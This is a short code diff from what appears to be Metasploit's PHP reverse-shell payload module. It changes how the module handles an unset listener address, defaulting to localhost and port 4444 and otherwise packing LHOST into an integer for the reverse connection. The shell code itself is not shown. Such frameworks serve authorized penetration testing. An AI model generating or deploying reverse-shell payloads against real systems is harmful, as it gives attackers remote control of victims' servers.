@@ -69,11 +69,13 @@ module ReversePhp
 	def php_reverse_shell
 
 		if (!datastore['LHOST'] or datastore['LHOST'].empty?)
-			# LHOST should always be set when we get here...  but in case it isn't,
-			raise Rex::ArgumentError, "LHOST is required"
+			# datastore is empty on msfconsole startup
+			ipaddr = 0x7f000001
+			port = 4444
+		else
+			ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
+			port = datastore['LPORT']
 		end
-		ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
-		port = datastore['LPORT']
 
 		#
 		# The regex looks like this unobfuscated:
